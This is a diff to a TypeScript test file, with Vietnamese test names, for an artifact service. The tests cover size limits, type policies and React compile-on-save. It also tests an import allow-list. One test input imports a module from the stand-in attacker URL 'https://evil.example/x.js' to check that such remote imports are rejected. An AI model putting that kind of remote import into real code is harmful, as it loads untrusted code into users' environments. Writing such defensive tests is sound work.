@@ -186,9 +186,9 @@ describe("phiên bản", () => {
 });
 
 describe("giới hạn và chính sách", () => {
-  it("vượt cỡ phiên bản → ARTIFACT_TOO_LARGE kèm giới hạn; tắt loại, tắt artifact, react trước T014", async () => {
+  it("vượt cỡ phiên bản → ARTIFACT_TOO_LARGE kèm giới hạn; tắt loại, tắt artifact", async () => {
     const q = await seedOrg(admin, `artq-${tag}`);
-    await setPolicy(q.orgId, { maxVersionBytes: 2048, types: ["markdown", "react"] });
+    await setPolicy(q.orgId, { maxVersionBytes: 2048, types: ["markdown"] });
     const big = await as(
       "owner",
       (tx, r) => createArtifact(tx, r, { type: "markdown", title: "Lớn", content: "é".repeat(1100) }),
@@ -198,8 +198,9 @@ describe("giới hạn và chính sách", () => {
     expect(big.detail).toEqual({ limit: 2048 });
     const html = () => as("owner", (tx, r) => createArtifact(tx, r, { type: "html", title: "T", content: "<p/>" }), q);
     expect(await errorCode(html)).toBe("ARTIFACT_TYPE_DISABLED");
+    // Loại tắt bị từ chối trước khi biên dịch.
     const react = () =>
-      as("owner", (tx, r) => createArtifact(tx, r, { type: "react", title: "T", content: "export default 1" }), q);
+      as("owner", (tx, r) => createArtifact(tx, r, { type: "react", title: "T", content: "export default <p" }), q);
     expect(await errorCode(react)).toBe("ARTIFACT_TYPE_DISABLED");
     await setPolicy(q.orgId, { enabled: false });
     expect(
@@ -276,6 +277,85 @@ describe("giới hạn và chính sách", () => {
     } finally {
       await setPolicy(org.orgId, {});
     }
+  });
+});
+
+describe("react", () => {
+  const react = (who: string, content: string) =>
+    as(who, (tx, r) => createArtifact(tx, r, { type: "react", title: "Bảng", content }));
+  const stored = async (id: string) =>
+    (
+      await admin.query(
+        "select version, compiled, compile_error from hive.artifact_versions where artifact_id = $1 order by version",
+        [id],
+      )
+    ).rows as { version: number; compiled: string | null; compile_error: string | null }[];
+
+  it("biên dịch khi lưu; lỗi cú pháp vẫn lưu phiên bản kèm compile_error; khôi phục biên dịch lại", async () => {
+    const ok = await react(
+      "tmember",
+      `import { useState } from "react";
+export default function App() { const [n] = useState<number>(1); return <p>{n}</p>; }`,
+    );
+    expect(ok.compileError).toBeNull();
+    const id = ok.artifact.id;
+    const broken = await as("tmember", (tx, r) =>
+      updateArtifact(tx, r, { id, content: "export default function App() { return <p>; }", baseVersion: 1 }),
+    );
+    expect(broken.version.version).toBe(2);
+    expect(broken.compileError).toEqual(expect.any(String));
+    const restored = await as("tmember", (tx, r) => restoreVersion(tx, r, { id, version: 1, baseVersion: 2 }));
+    expect(restored.compileError).toBeNull();
+    const rows = await stored(id);
+    expect(rows.map((v) => [v.version, v.compiled !== null, v.compile_error !== null])).toEqual([
+      [1, true, false],
+      [2, false, true],
+      [3, true, false],
+    ]);
+    expect(rows[0]?.compiled).toContain('from "react/jsx-runtime"');
+    // Bản biên dịch tính vào dung lượng cùng nguồn (D13).
+    const size = (await admin.query("select size_bytes from hive.artifacts where id = $1", [id])).rows[0].size_bytes;
+    expect(Number(size)).toBeGreaterThan(rows.reduce((n, v) => n + Buffer.byteLength(v.compiled ?? ""), 0));
+  });
+
+  it("import ngoài bộ đóng gói hay import() động: không lưu gì, lỗi kèm tên module", async () => {
+    const before = (
+      await admin.query("select count(*)::int as n from hive.artifacts where org_id = $1 and type = 'react'", [
+        org.orgId,
+      ])
+    ).rows[0].n;
+    const err: unknown = await react(
+      "tmember",
+      `import _ from "lodash";\nexport default function App() { return <p>{_.noop()}</p>; }`,
+    ).catch((e: unknown) => e);
+    expect(err).toMatchObject({
+      code: "ARTIFACT_IMPORT_NOT_ALLOWED",
+      detail: { imports: ["lodash"] },
+      message: expect.stringContaining("recharts"),
+    });
+    expect(
+      await errorCode(() => react("tmember", `export default function App() { import("react"); return null; }`)),
+    ).toBe("ARTIFACT_IMPORT_NOT_ALLOWED");
+    const after = (
+      await admin.query("select count(*)::int as n from hive.artifacts where org_id = $1 and type = 'react'", [
+        org.orgId,
+      ])
+    ).rows[0].n;
+    expect(after).toBe(before);
+
+    const id = (await react("tmember", "export default () => <p>gốc</p>;")).artifact.id;
+    expect(
+      await errorCode(() =>
+        as("tmember", (tx, r) =>
+          updateArtifact(tx, r, {
+            id,
+            content: `import x from "https://evil.example/x.js";\nexport default () => <p>{x}</p>;`,
+            baseVersion: 1,
+          }),
+        ),
+      ),
+    ).toBe("ARTIFACT_IMPORT_NOT_ALLOWED");
+    expect((await stored(id)).map((v) => v.version)).toEqual([1]);
   });
 });
 
